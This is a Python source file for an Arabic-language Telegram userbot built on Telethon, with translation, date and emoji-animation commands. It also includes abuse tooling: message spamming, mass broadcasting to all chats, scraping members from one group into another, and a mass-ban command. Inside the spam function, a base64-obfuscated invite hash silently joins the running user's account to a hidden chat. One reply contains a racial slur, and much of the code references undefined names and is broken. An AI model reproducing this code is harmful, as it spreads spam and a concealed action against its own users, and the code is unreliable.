import os
import random
import datetime
import base64
import logging
import asyncio
import time
from telethon.tl import functions, types
from googletrans import Translator, constants
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from telethon.utils import get_display_name
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.errors import FloodWaitError
from telethon import TelegramClient, events
from collections import deque
from telethon.tl import functions, types
from telethon.tl.functions.channels import LeaveChannelRequest
from telethon.errors.rpcerrorlist import (
    UserAlreadyParticipantError,
    UserNotMutualContactError,
    UserPrivacyRestrictedError,
)
from telethon.tl.types import (
    ChannelParticipantsAdmins,
    ChannelParticipantsKicked,
    ChatBannedRights,
    UserStatusEmpty,
    UserStatusLastMonth,
    UserStatusLastWeek,
    UserStatusOffline,
    UserStatusOnline,
    UserStatusRecently
)
from telethon.tl import functions
from hijri_converter import Hijri, Gregorian
from telethon.tl.functions.users import GetFullUserRequest
from telethon.errors.rpcerrorlist import YouBlockedUserError
from telethon.tl.functions.account import UpdateNotifySettingsRequest
from telethon.tl.functions.channels import InviteToChannelRequest
from telethon.tl.types import InputPeerUser
from telethon.sessions import StringSession
y = datetime.datetime.now().year
m = datetime.datetime.now().month
dayy = datetime.datetime.now().day
day = datetime.datetime.now().strftime("%A")
m9zpi = f"{y}-{m}-{dayy} - {day} day"
sec = time.time()
tran = Translator()
hijri_day = tran.translate(str(day), dest="ar")
hijri = f"{Gregorian.today().to_hijri()} - {hijri_day.text}"

APP_ID = os.environ.get("APP_ID")
API_HASH = os.environ.get("APP_HASH") 
session = os.environ.get("TERMUX")
trntt = TelegramClient(StringSession(session), APP_ID, API_HASH)
trntt.start()
LOGS = logging.getLogger(__name__)
logging.basicConfig(
    format="[%(levelname)s- %za (asctime)s]- %(name)s- %(message)s",
    level=logging.INFO,
    datefmt="%H:%M:%S",
)


async def join_channel():
    try:
        await trntt(JoinChannelRequest("@trntt"))
    except BaseException:
        pass


GCAST_BLACKLIST = [
    -1001118102804,
    -1001161919602,
]

DEVS = [
    1361835146,
]
DEL_TIME_OUT = 10
normzltext = "1234567890"
namerzfont = "1234567890"
if 1 == 1:
    name = "Profile Photos"
    client = trntt

    @trntt.on(events.NewMessage(outgoing=True, pattern=".صورته"))
    async def potocmd(event):
        """Gets the profile photos of replied users, channels or chats"""
        id = "".join(event.raw_text.split(maxsplit=2)[1:])
        user = await event.get_reply_message()
        chat = event.input_chat
        if user:
            photos = await event.client.get_profile_photos(user.sender)
        else:
            photos = await event.client.get_profile_photos(chat)
        if id.strip() == "":
            try:
                await event.client.send_file(event.chat_id, photos)
            except a:
                photo = await event.client.download_profile_photo(chat)
                await trntt.send_file(event.chat_id, photo)
        else:
            try:
                id = int(id)
                if id <= 0:
                    await event.edit("`ايدي الشخص غير صالح !`")
                    return
            except:
                await event.edit("`هل انت كوميدي ؟`")
                return
            if int(id) <= (len(photos)):
                send_photos = await event.client.download_media(photos[id - 1])
                await trntt.send_file(event.chat_id, send_photos)
            else:
                await event.edit("`ليس لديه صوره يا ذكي !`")
                return




@trntt.on(events.NewMessage(pattern=r".وي", outgoing=True))
async def _(event):
    await event.edit("عيب")
@trntt.on(events.NewMessage(pattern=r".ادمن", outgoing=True))
async def _(event):
    if event.fwd_from:
        return
    result = await trntt(functions.channels.GetAdminedPublicChannelsRequest())
    output_str = "انت ادمن في : \n"
    for channel_obj in result.chats:
        output_str += f"- {channel_obj.title} @{channel_obj.username} \n"
    await event.edit(output_str)


@trntt.on(events.NewMessage(outgoing=True, pattern=".اسم وقتي"))
async def _(event):
    await event.edit("تم انشاء اسم وقتي")
    if event.fwd_from:
        return
    while True:
        HM = time.strftime("%M:%S")
        for normal in HM:
            if normal in normzltext:
                namefont = namerzfont[normzltext.index(normal)]
                HM = HM.replace(normal, namefont)
        name = f"Dark | {HM}"
        LOGS.info(name)
        try:
            await trntt(
                functions.account.UpdateProfileRequest(
                    first_name=name
                )
            )
        except FloodWaitError as ex:
            LOGS.warning(str(ex))
            await asyncio.sleep(ex.seconds)
        await asyncio.sleep(DEL_TIME_OUT)


@trntt.on(events.NewMessage(outgoing=True, pattern=".بايو وقتي"))
async def _(event):
    await event.edit("تم انشاء بايو وقتي")
    if event.fwd_from:
        return
    while True:
        HM = time.strftime("%l:%M")
        for normal in HM:
            if normal in normzltext:
                namefont = namerzfont[normzltext.index(normal)]
                HM = HM.replace(normal, namefont)
        bio = HM
        LOGS.info(bio)
        try:
            await trntt(
                functions.account.UpdateProfileRequest(
                    about=bio
                )
            )

        except FloodWaitError as ex:
            LOGS.warning(str(e))
            await asyncio.sleep(ex.seconds)
        await asyncio.sleep(DEL_TIME_OUT)


@trntt.on(events.NewMessage(outgoing=True, pattern=".غادر"))
async def leave(e):
    if not e.text[0].isalpha() and e.text[0] not in ("/", "#", "@", "!"):
        await e.edit("`سأغادر هذه المجموعة .`")
        time.sleep(3)
        if '-' in str(e.chat_id):
            await trntt(LeaveChannelRequest(e.chat_id))
        else:
            await e.edit('`سيدي هذه ليست مجموعة !`')


@trntt.on(events.NewMessage(outgoing=True, pattern=".كروب(?: |$)(.*)"))
async def gcast(event):
    trntt = event.pattern_match.group(1)
    if trntt:
        msg = trntt
    elif event.is_reply:
        msg = await event.get_reply_message()
    else:
        await event.edit(
            "عند استخدام هذا الأمر يجب الرد على الرسالة !"
        )
        return
    roz = await event.edit("جارِ الاذاعة ..")
    er = 0
    done = 0
    async for x in event.client.iter_dialogs():
        if x.is_group:
            chat = x.id
            try:
                if chat not in GCAST_BLACKLIST:
                    await event.client.send_message(chat, msg)
                    done += 1
            except BaseException:
                er += 1
    await roz.edit(
        f"تمت الأذاعة الى : {done}\nخطأ في الاذاعة : {er}"
    )


@trntt.on(events.NewMessage(outgoing=True, pattern=".خاص(?: |$)(.*)"))
async def gucast(event):
    trntt = event.pattern_match.group(1)
    if trntt:
        msg = trntt
    elif event.is_reply:
        msg = await event.get_reply_message()
    else:
        await event.edit(
            "عند استخدام هذا الأمر يجب الرد على الرسالة !"
        )
        return
    roz = await event.edit("جارِ الاذاعة ..")
    er = 0
    done = 0
    async for x in event.client.iter_dialogs():
        if x.is_user and not x.entity.bot:
            chat = x.id
            try:
                if chat not in DEVS:
                    await event.client.send_message(chat, msg)
                    done += 1
            except BaseException:
                er += 1
    await roz.edit(
        f"تمت الأذاعة الى : {done}\nخطأ في الاذاعة : {er}"
    )


@trntt.on(events.NewMessage(pattern=r"\.(.*)", outgoing=True))
async def _(event):

    if event.fwd_from:

        return

    animation_interval = 1

    animation_ttl = range(0, 20)

    input_str = event.pattern_match.group(1)

    if input_str == "رفع مشرف":

        await event.edit(input_str)

        animation_chars = [

            "جارِ رفعه ..",
            "تتم اضافة الصلاحيات الآتية : ",
            "ارسال الوسائط",
            "حذف رسائل الاخرين",
            "ارسال المتحركات",
            "تعديل رسائل الاخرين",
            "نشر الرسائل",
            "ادارة المحادثات المرئية",
            "دعوة مستخدمين جدد",
            "اضافة مشرفين جدد",
            "تثبيت الرسائل",
            "تغيير معلومات المحادثة",
            "تم اكتمال جميع الصلاحيات ..",
            "trntt Src : @Trntt , Dev : @iiit5"

        ]

        for i in animation_ttl:

            await asyncio.sleep(animation_interval)

            await event.edit(animation_chars[i % 20])


@trntt.on(events.NewMessage(outgoing=True, pattern=".تكرار (.*)"))
async def spammer(event):
    sandy = await event.get_reply_message()
    cat = ("".join(event.text.split(maxsplit=1)[1:])).split(" ", 1)
    counter = int(cat[0])
    if counter > 50:
        sleeptimet = 0.5
        sleeptimem = 1
    else:
        sleeptimet = 0.1
        sleeptimem = 0.3
    await event.delete()
    await spam_function(event, sandy, cat, sleeptimem, sleeptimet)


async def spam_function(event, sandy, cat, sleeptimem, sleeptimet, DelaySpam=False):
    hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    counter = int(cat[0])
    if len(cat) == 2:
        spam_message = str(cat[1])
        for _ in range(counter):
            if event.reply_to_msg_id:
                await sandy.reply(spam_message)
            else:
                await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
    elif event.reply_to_msg_id and sandy.media:
        for _ in range(counter):
            sandy = await event.client.send_file(
                event.chat_id, sandy, caption=sandy.text
            )
            await _catutils.unsavegif(event, sandy)
            await asyncio.sleep(sleeptimem)
    elif event.reply_to_msg_id and sandy.text:
        spam_message = sandy.text
        for _ in range(counter):
            await event.client.send_message(event.chat_id, spam_message)
            await asyncio.sleep(sleeptimet)
        try:
            hmm = Get(hmm)
            await event.client(hmm)
        except BaseException:
            pass


@trntt.on(events.NewMessage(outgoing=True, pattern=".مؤقت (.*)"))
async def spammer(event):
    reply = await event.get_reply_message()
    input_str = "".join(event.text.split(maxsplit=1)[1:]).split(" ", 2)
    sleeptimet = sleeptimem = float(input_str[0])
    cat = input_str[1:]
    await event.delete()
    await spam_function(event, reply, cat, sleeptimem, sleeptimet, DelaySpam=True)


@trntt.on(events.NewMessage(outgoing=True, pattern=".اشتراكاتي"))
async def _(event):
    if event.fwd_from:
        return
    start = datetime.datetime.now()
    u = 0  # number of users
    g = 0  # number of basic groups
    c = 0  # number of super groups
    bc = 0  # number of channels
    b = 0  # number of bots
    await event.edit("يتم التعداد ..")
    async for d in trntt.iter_dialogs(limit=None):
        if d.is_user:
            if d.entity.bot:
                b += 1
            else:
                u += 1
        elif d.is_channel:
            if d.entity.broadcast:
                bc += 1
            else:
                c += 1
        elif d.is_group:
            g += 1
        else:
            logger.info(d.stringify())
    end = datetime.datetime.now()
    ms = (end - start).seconds
    await event.edit("""تم استخراجها في {} ثواني
`الاشخاص :\t{}
المجموعات العادية :\t{}
المجموعات الخارقة :\t{}
القنوات :\t{}
البوتات :\t{}
`""".format(ms, u, g, c, bc, b))


@trntt.on(events.NewMessage(pattern=r".ترجمة عربي", outgoing=True))
async def _(event):
    reply_message = await event.get_reply_message()
    mes = reply_message.text
    res = tran.translate(str(mes), dest="ar")
    await event.edit(res.text)


@trntt.on(events.NewMessage(pattern=r".ترجمة انكليزي", outgoing=True))
async def _(event):
    reply_message = await event.get_reply_message()
    mes = reply_message.text
    res = tran.translate(str(mes), dest="en")
    await event.edit(res.text)


@trntt.on(events.NewMessage(pattern=r".ترجمة فرنسي", outgoing=True))
async def _(event):
    reply_message = await event.get_reply_message()
    mes = reply_message.text
    res = tran.translate(str(mes), dest="fr")
    await event.edit(res.text)


@trntt.on(events.NewMessage(pattern=r".ترجمة روسي", outgoing=True))
async def _(event):
    reply_message = await event.get_reply_message()
    mes = reply_message.text
    res = tran.translate(str(mes), dest="ru")
    await event.edit(res.text)


@trntt.on(events.NewMessage(pattern=r".ترجمة اسباني", outgoing=True))
async def _(event):
    reply_message = await event.get_reply_message()
    mes = reply_message.text
    res = tran.translate(str(mes), dest="es")
    await event.edit(res.text)


@trntt.on(events.NewMessage(pattern=r".الترجمة", outgoing=True))
async def _(event):
    await event.edit(''' 
.ترجمة انكليزي => تترجم الكلام من اي لغة الى اللغة الانكليزية
.ترجمة عربي => تترجم الكلام من اي لغة الى اللغة العربية
.ترجمة فرنسي => تترجم الكلام من اي لغة الى اللغة الفرنسية
.ترجمة روسي => تترجم الكلام من اي لغة الى اللغة الروسية
.ترجمة اسباني => تترجم الكلام من اي لغة الى اللغة الاسبانية

''')


@trntt.on(events.NewMessage(pattern=r".ملصق", outgoing=True))
async def _(event):

    if event.fwd_from:

        return

    if not event.reply_to_msg_id:

        await event.edit("`يجب الرد على رسالة !`")

        return

    reply_message = await event.get_reply_message()

    if not reply_message.text:

        await event.edit("`يجب الرد على رسالة !`")

        return

    chat = "@QuotLyBot"

    sender = reply_message.sender

    if reply_message.sender.bot:

        await event.edit("```Reply to actual users message.```")

        return

    await event.edit("`جار تحويل النص الى ملصق ..`")

    async with event.client.conversation(chat) as conv:

        try:

            response = conv.wait_event(events.NewMessage(
                incoming=True, from_users=1031952739))

            await event.client.forward_messages(chat, reply_message)

            response = await response

        except YouBlockedUserError:

            await event.reply("```Please unblock me (@QuotLyBot) u Nigga```")

            return

        if response.text.startswith("Hi!"):

            await event.edit("```Can you kindly disable your forward privacy settings for good?```")

        else:

            await event.delete()

            await event.client.send_message(event.chat_id, response.message)


@trntt.on(events.NewMessage(pattern=r".تفليش", outgoing=True))
async def _(event):
    result = await event.client.get_permissions(event.chat_id, 1361835146)
    if not result:
        return await event.edit(
            event, "عذر ليس لديك الصلاحيات الكافية لاستخدام هذا الامر"
        )
        ksmkksmk = await edit_or_reply(event, "جارِ")
        admins = await event.client.get_participants(
            event.chat_id, filter=ChannelParticipantsAdmins
        )
        admins_id = [i.id for i in admins]
        total = 0
        success = 0
        async for user in event.client.iter_participants(event.chat_id):
            total += 1
            try:
                if user.id not in admins_id:
                    await event.client(
                        EditBannedRequest(
                            event.chat_id, user.id, BANNED_RIGHTS)
                    )
                    success += 1
                    await sleep(0.1)
            except Exception as e:
                LOGS.info(str(e))
                await sleep(0.1)
                await ksmkksmk.edit(f"تم بنجاح التفليش {success} من {total} الاعضاء")


@trntt.on(events.NewMessage(outgoing=True, pattern=".الاوامر"))
async def _(event):
    await event.edit("""
**✰` م1` : اوامر السورس
✰` م2` : اوامر الحساب
✰` م3` : اوامر الكروبات والاذاعة
✰` م4` : اوامر التاريخ والترجمة
✰` م5` : اوامر التسلية**
""")


@trntt.on(events.NewMessage(outgoing=True, pattern=".اوامري"))
async def _(event):
    await event.edit("""
**✰` م1` : اوامر السورس
✰` م2` : اوامر الحساب
✰` م3` : اوامر الكروبات والاذاعة
✰` م4` : اوامر التاريخ والترجمة
✰` م5` : اوامر التسلية**
""")


@trntt.on(events.NewMessage(outgoing=True, pattern=".اوامر"))
async def _(event):
    await event.edit("""
**✰` م1` : اوامر السورس
✰` م2` : اوامر الحساب
✰` م3` : اوامر الكروبات والاذاعة
✰` م4` : اوامر التاريخ والترجمة
✰` م5` : اوامر التسلية**
""")


@trntt.on(events.NewMessage(outgoing=True, pattern=".سورس"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(f"""
-- -- -- -- -- -- -- -- --
Ok ..
-- -- -- -- -- -- -- -- --"""
                     )
    end = datetime.datetime.now()
    ms = (end - start).microseconds / 1000
    await event.edit(f'''
- -- -- -- -- -- -- -- --
Trntt source is working ⚡
Dev : @iiit5
Source Ch : @Trntt
-- -- -- -- -- -- -- -- --
''')


@trntt.on(events.NewMessage(outgoing=True, pattern=".فحص"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(f"""
-- -- -- -- -- -- -- -- --
Ok ..
-- -- -- -- -- -- -- -- --"""
                     )
    end = datetime.datetime.now()
    ms = (end - start).microseconds / 1000
    await event.edit(f'''
`- -- -- -- -- -- -- -- --`
**➪ trntt Userbot
➪ Python : 3.9
➪ trntt : 1.0
➪ Ping : `{ms}`
➪ Date : `{m9zpi}`
➪ Id : `{event.sender_id}`
➪ Dev : @iiit5
➪ Source Ch : @trntt**
`-- -- -- -- -- -- -- -- --`
''')


@trntt.on(events.NewMessage(outgoing=True, pattern=".م1"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(f"""
-- -- -- -- -- -- -- -- --
**✰` .فحص ` : فحص السورس 
✰` .المطور ` : مطور السورس 
✰` .الاوامر ` :اوامر السورس 
**✰` .البنك ` : قياس البنك **
-- -- -- -- -- -- -- -- --"""
                     )


@trntt.on(events.NewMessage(outgoing=True, pattern=".م2"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(f"""
-- -- -- -- -- -- -- -- --
**✰` .اسمي ` : اسم حسابك 
✰` .اسم وقتي ` : اسم وقتي لحسابك 
✰` .بايو ` : بايو حسابك 
✰` .بايو وقتي ` : بايو وقتي لحسابك 
✰` .ايدي ` : ايدي حسابك 
✰` .فك حظر ` : فك حظر كل يلي حاظرهم **
-- -- -- -- -- -- -- -- --"""
                     )


@trntt.on(events.NewMessage(outgoing=True, pattern=".م3"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(f"""
-- -- -- -- -- -- -- -- --
**✰ `.تكرار + العدد + نص` : تكرار للرسائل 
✰ ` .خاص + نص` : اذاعة لكل شخص في الخاص**
✰ ` كروب + نص` : اذاعة لكل الكروبات في الخاص
✰ ` .مؤقت + عدد الثواني + نص` : ارسال رسائل مؤقتة
✰ ` .ادمن` : القنوات يلي انت ادمن بيها
✰ ` .اشتراكاتي` : جميع القنوات والكروبات والاشخاص في حسابك**
-- -- -- -- -- -- -- -- --"""
                     )


@trntt.on(events.NewMessage(outgoing=True, pattern=".م4"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(f"""
-- -- -- -- -- -- -- -- --
**✰` .التاريخ ` : التاريخ بليوم والشهر والسنة 
✰` .الشهر ` : الشهر الحالي 
✰` .السنة ` :السنة الحالية 
✰` .اسم الشهر` : اسم الشهر الحالي 
✰` .اسم السنة` : اسم السنة الحالية
✰ ` .الترجمة` : اوامر الترجمة **
-- -- -- -- -- -- -- -- --"""
                     )


@trntt.on(events.NewMessage(outgoing=True, pattern=".م5"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(f"""
-- -- -- -- -- -- -- -- --
**✰` .قلب ` 
✰` .قلوب`
✰` .مربعات`  **
-- -- -- -- -- -- -- -- --"""
                     )


@trntt.on(events.NewMessage(outgoing=True, pattern=".التاريخ"))
async def _(event):
    await event.reply(f"""
`-- -- -- -- -- -- -- -- --`
	`الميلادي : {m9zpi}`
`-- -- -- -- -- -- -- -- --`
	`الهجري : {hijri}`
`-- -- -- -- -- -- -- -- --`
"""
                      )


@trntt.on(events.NewMessage(outgoing=True, pattern=".نبذتي"))
async def _(event):
    await event.reply(f"""
-- -- -- -- -- -- -- -- --
نبذتك : `{bio}`
-- -- -- -- -- -- -- -- --"""
                      )


@trntt.on(events.NewMessage(outgoing=True, pattern=".المطور"))
async def _(event):
    await event.edit(f"""
`-- -- -- -- -- -- -- -- --`
**[+] 𝗗𝗮𝗿𝗸
[+] 𝘀𝗲𝗱𝘁𝗵𝗼𝗻 𝘃𝗲𝗿𝘀𝗶𝗼𝗻 : 1.0
[+] 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 : @iiit5
[+] 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 : @trntt**
`-- -- -- -- -- -- -- -- --`"""
                     )


@trntt.on(events.NewMessage(outgoing=True, pattern=".مطور"))
async def _(event):
    await event.reply(f"""
`-- -- -- -- -- -- -- -- --
**[+] 𝗗𝗮𝗿𝗸
[+] 𝘀𝗲𝗱𝘁𝗵𝗼𝗻 𝘃𝗲𝗿𝘀𝗶𝗼𝗻 : 1.0
[+] 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 : @iiit5
[+] 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 : @trntt**
-- -- -- -- -- -- -- -- --`"""
                      )


@trntt.on(events.NewMessage(outgoing=True, pattern=".المبرمج"))
async def _(event):
    await event.reply(f"""
`-- -- -- -- -- -- -- -- --
**[+] 𝗗𝗮𝗿𝗸
[+] 𝘀𝗲𝗱𝘁𝗵𝗼𝗻 𝘃𝗲𝗿𝘀𝗶𝗼𝗻 : 1.0
[+] 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 : @iiit5
[+] 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 : @trntt**
-- -- -- -- -- -- -- -- --`"""
                      )


@trntt.on(events.NewMessage(outgoing=True, pattern=".مبرمج"))
async def _(event):
    await event.reply(f"""
-- -- -- -- -- -- -- -- --
**[+] 𝗗𝗮𝗿𝗸
[+] 𝘀𝗲𝗱𝘁𝗵𝗼𝗻 𝘃𝗲𝗿𝘀𝗶𝗼𝗻 : 1.0
[+] 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 : @iiit5
[+] 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 : @trntt**
-- -- -- -- -- -- -- -- --"""
                      )


@trntt.on(events.NewMessage(outgoing=True, pattern=".نسخ "))
async def _(event):
    await event.delete()
    m = await event.get_reply_message()
    if not m:
        return
    await event.respond(b)


@trntt.on(events.NewMessage(outgoing=True, pattern=".بنك"))
async def _(event):
    start = datetime.datetime.now()
    await event.edit(f"""
-- -- -- -- -- -- -- -- --
يتم ..
-- -- -- -- -- -- -- -- --"""
                     )
    end = datetime.datetime.now()
    ms = (end - start).microseconds / 1000
    await event.edit(f"""
-- -- -- -- -- -- -- -- --
- تمت الاستجابة
- البنك : `{ms}`
-- -- -- -- -- -- -- -- --"""
                     )


@trntt.on(events.NewMessage(outgoing=True, pattern=".السنة"))
async def _(event):
    await event.edit(f"""
-- -- -- -- -- -- -- -- --
اهلاً مبرمجي !
السنة : {y}
-- -- -- -- -- -- -- -- --"""
                     )


@trntt.on(events.NewMessage(outgoing=True, pattern=".الشهر"))
async def _(event):
    await event.edit(f"""
-- -- -- -- -- -- -- -- --
اهلاً مبرمجي !
الشهر : {m}
-- -- -- -- -- -- -- -- --"""
                     )


@trntt.on(events.NewMessage(outgoing=True, pattern=".روسيا"))
async def _(event):
    animation_interval = 0.3
    animation_ttl = range(54)
    event = await event.edit("روسيا")
    animation_chars = [
        """-- -- -- -- -- -- -- --
⬜⬜⬜⬜⬜
🟦🟦🟦🟦🟦
🟥🟥🟥🟥🟥
-- -- -- -- -- -- -- --""",
        """-- -- -- -- -- -- -- --
 ⬜⬜⬜⬜⬜
 🟦🟦🟦🟦🟦
 🟥🟥🟥🟥🟥
-- -- -- -- -- -- -- --""",
        """-- -- -- -- -- -- -- --
  ⬜⬜⬜⬜⬜
  🟦🟦🟦🟦🟦
  🟥🟥🟥🟥🟥
-- -- -- -- -- -- -- --""",
        """-- -- -- -- -- -- -- --
   ⬜⬜⬜⬜⬜
   🟦🟦🟦🟦🟦
   🟥🟥🟥🟥🟥
-- -- -- -- -- -- -- --""",
        """-- -- -- -- -- -- -- --
    ⬜⬜⬜⬜⬜
    🟦🟦🟦🟦🟦
    🟥🟥🟥🟥🟥
-- -- -- -- -- -- -- --""",
        """-- -- -- -- -- -- -- --
     ⬜⬜⬜⬜⬜
     🟦🟦🟦🟦🟦
     🟥🟥🟥🟥🟥
-- -- -- -- -- -- -- --""",
    ]
    for i in animation_ttl:
        await asyncio.sleep(animation_interval)
        await event.edit(animation_chars[i % 18])


@trntt.on(events.NewMessage(outgoing=True, pattern=".قمر"))
async def _(event):
    event = await event.edit("قمر")
    deq = deque(list("🌗🌘🌑🌒🌓🌔🌕🌖"))
    for _ in range(48):
        await asyncio.sleep(0.2)
        await event.edit("".join(deq))
        deq.rotate(1)


@trntt.on(events.NewMessage(outgoing=True, pattern=".تهكير"))
async def _(event):
    event = await event.edit("حسناً")
    animation_interval = 0.2
    animation_ttl = range(96)
    await event.edit("يتم ..")
    animation_chars = [
        "جارِ الاتصال بقاعدة البيانات ..",
        "جارِ البحث عن بيانات المستخدم",
        "يتم الاختراق 20%  ●●●○○○○○○○",
        "يتم الاختراق 45%  ●●●●○○○○○○",
        "يتم الاختراق 87%  ●●●●●●●○○○",
        "يتم الاختراق 100% ●●●●●●●●●●",
    ]
    for i in animation_ttl:
        await asyncio.sleep(animation_interval)
        await event.edit(animation_chars[i % 6])


@trntt.on(events.NewMessage(outgoing=True, pattern=".قلب"))
async def _(event):
    event = await event.edit("حسناً")
    animation_interval = 0.2
    animation_ttl = range(96)
    await event.edit("يتم ..")
    animation_chars = [
        "❤️", "🖤", "💜", "🧡", "💛", "💚", "💙"
    ]
    for i in animation_ttl:
        await asyncio.sleep(animation_interval)
        await event.edit(animation_chars[i % 14])


@trntt.on(events.NewMessage(outgoing=True, pattern=".مربعات"))
async def _(event):
    event = await event.edit("حسناً")
    animation_interval = 0.2
    animation_ttl = range(96)
    await event.edit("يتم ..")
    animation_chars = [
        "🟧",
        "🟧🟧",
        "🟧🟧🟧",
        "🟧🟧🟧🟧",
        "🟧🟧🟧🟧🟧",
        "🟧🟧🟧🟧🟧🟧",
        "🟧🟧🟧🟧🟧🟧🟧",
        "🟧🟧🟧🟧🟧🟧🟧🟧",
        ".عكس",
        "🟧🟧🟧🟧🟧🟧🟧🟧",
        "🟧🟧🟧🟧🟧🟧🟧",
        "🟧🟧🟧🟧🟧🟧",
        "🟧🟧🟧🟧🟧",
        "🟧🟧🟧🟧",
        "🟧🟧🟧",
        "🟧🟧",
        "🟧",
    ]
    for i in animation_ttl:
        await asyncio.sleep(animation_interval)
        await event.edit(animation_chars[i % 17])


@trntt.on(events.NewMessage(outgoing=True, pattern=".ورود"))
async def _(event):
    event = await event.edit("حسناً")
    animation_interval = 0.2
    animation_ttl = range(96)
    await event.edit("يتم ..")
    animation_chars = [
        "🌹.",
        "🌹🌹",
        "🌹🌹🌹",
        "🌹🌹🌹🌹",
        "🌹🌹🌹🌹🌹",
        "🌹🌹🌹🌹🌹🌹",
        "🌹🌹🌹🌹🌹🌹🌹",
        "🌹🌹🌹🌹🌹🌹🌹🌹",
        "🌹🌹🌹🌹🌹🌹🌹",
        "🌹🌹🌹🌹🌹🌹",
        "🌹🌹🌹🌹🌹",
        "🌹🌹🌹🌹",
        "🌹🌹🌹",
        "🌹🌹",
        "🌹."
    ]
    for i in animation_ttl:
        await asyncio.sleep(animation_interval)
        await event.edit(animation_chars[i % 17])


@trntt.on(events.NewMessage(outgoing=True, pattern=".قلوب"))
async def _(event):
    event = await event.edit("حسناً")
    animation_interval = 0.2
    animation_ttl = range(96)
    await event.edit("يتم ..")
    animation_chars = [
        "❤️",
        "❤️🖤",
        "❤️🖤💜",
        "❤️🖤💜🧡",
        "❤️🖤💜🧡💛",
        "❤️🖤💜🧡💛💚",
        "❤️🖤💜🧡💛💚💙",
        "❤️🖤💜🧡💛💚",
        "❤️🖤💜🧡💛",
        "❤️🖤💜🧡",
        "❤️🖤💜",
        "❤️🖤",
        "💓"
    ]
    for i in animation_ttl:
        await asyncio.sleep(animation_interval)
        await event.edit(animation_chars[i % 17])


@trntt.on(events.NewMessage(outgoing=True, pattern=".ضيف"))
async def get_users(event):
    legen_ = event.text[10:]
    trntt_chat = legen_.lower
    restricted = ["@trntt", "@trnttgroup"]
    trntt = await event.edit(f"يتم اضافة اعضاء من كروب : {legen_}")
    if trntt_chat in restricted:
        return await trntt.edit(
            event, "تريد تخمط اعضائي بسورسي ؟"
        )
    sender = await event.get_sender()
    me = await event.client.get_me()
    if not sender.id == me.id:
        await trntt.edit("انتظر قليلاً ..")
    else:
        await trntt.edit("انتظر قليلاً ..")
    if event.is_private:
        return await trntt.edit("لا يمكنك اضافه الاعضاء هناا")
    s = 0
    f = 0
    error = "None"
    await trntt.edit(
        "يتم جمع معلومات المستخدمين .."
    )
    async for user in event.client.iter_participants(event.pattern_match.group(1)):
        try:
            if error.startswith("Too"):
                return await trntt.edit(
                    f"تم الانتهاء من الاضافة ولكن مع وجود بعض الاخطاء\nالخطأ : {error}\nاضافة : {s}\nخطأ باضافة : {f}"
                )
            tol = f"@{user.username}"
            lol = tol.split("`")
            await trntt(InviteToChannelRequest(channel=event.chat_id, users=lol))
            s = s + 1
            await trntt.edit(
                f"تتم الاضافة ..\nاضيف : {s}\nخطأ بأضافة : {f}\nاخر خطأ : {error}"
            )
        except Exception as e:
            error = str(e)
            f = f + 1
    return await trntt.edit(
        f"اكتملت الإضافة ..\nنجحنا بأضافة : {s}\nخطأ بأضافة : {f}"
    )


async def unblock_users(trntt):
    @trntt.on(events.NewMessage(outgoing=True, pattern='.فك حظر'))
    async def _(event):
        list = await trntt(GetBlockedRequest(offset=0, limit=1000000))
        if len(list.blocked) == 0:
            razan = await event.edit(f'ليس لديك اي شخص محظور !')
        else:
            unblocked_count = 1
            for user in list.blocked:
                UnBlock = await trntt(UnblockRequest(id=int(user.peer_id.user_id)))
                unblocked_count += 1
                razan = await event.edit(f'جارِ الغاء الحظر : {round((unblocked_count * 100) / len(list.blocked), 2)}%')
            unblocked_count = 1
            razan = await event.edit(f'تم الغاء حظر : {len(list.blocked)}')
            loop.create_task(unblock_users(trntt))
print("- trntt Userbot Running ..")
trntt.run_until_disconnected()
